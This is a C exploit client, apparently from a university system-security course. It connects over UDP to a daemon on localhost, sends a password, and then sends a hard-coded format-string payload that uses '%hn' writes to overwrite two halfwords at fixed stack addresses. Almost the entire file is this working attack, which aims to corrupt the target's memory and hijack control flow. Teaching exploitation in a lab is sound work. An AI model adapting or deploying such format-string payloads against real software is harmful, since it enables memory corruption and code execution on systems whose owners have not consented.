// this is for use in syssec course only
// no guraenties of beeing bug free (quite the opposite ;) )
// please don't share this code.

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


void diep(char *s) {
    perror(s);
    exit(1);
}

int main(int argc, char **argv ) {
    struct sockaddr_in stSockAddr;
    int Res;
    int SocketFD = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    char *hello = "\x44\xd3\xff\xff\x46\xd3\xff\xff%48871x%21$hn%9199x%22$hn";
    int port;

#define BUFFSIZE 512
    char response[BUFFSIZE];
    int bytes_read;

    if (-1 == SocketFD) {
        perror("cannot create socket");
        exit(EXIT_FAILURE);
    }

    memset(&stSockAddr, 0, sizeof(stSockAddr));

    if (argc<2) {
        printf("usage : %s <port> <pass>\n",argv[0]);
        exit(-1);
    }
    // get port from parameters
    port=atoi(argv[1]);

    stSockAddr.sin_family = AF_INET;
    stSockAddr.sin_port = htons(port);
    printf("connecting to 127.0.0.1:%d \n",port);
    Res = inet_pton(AF_INET, "127.0.0.1", &stSockAddr.sin_addr);

    if (0 > Res) {
        perror("error: first parameter is not a valid address family");
        close(SocketFD);
        exit(EXIT_FAILURE);
    }
    else if (0 == Res) {
        perror("char string (second parameter does not contain valid ipaddress)");
        close(SocketFD);
        exit(EXIT_FAILURE);
    }

    // send pass, done once, need to be done again if deamon crashes
    if (sendto(SocketFD, argv[2], strlen(argv[2])+1, 0,
               (const struct sockaddr *)&stSockAddr, sizeof(stSockAddr))==-1)
        diep("sendto()");
    bytes_read=read(SocketFD,response,BUFFSIZE);
    if(bytes_read == -1)
        diep("read()");

    printf("bytes read: %d \ndata read: %s\n", bytes_read,response);

    if (sendto(SocketFD, hello, strlen(hello)+1, 0,
               (const struct sockaddr *)&stSockAddr, sizeof(stSockAddr))==-1)
        diep("sendto()");
    bytes_read=read(SocketFD,response,BUFFSIZE);

    if(bytes_read == -1)
        diep("read()");

    printf("bytes read: %d \ndata read: %s\n", bytes_read,response);

    close(SocketFD);
    return EXIT_SUCCESS;
}
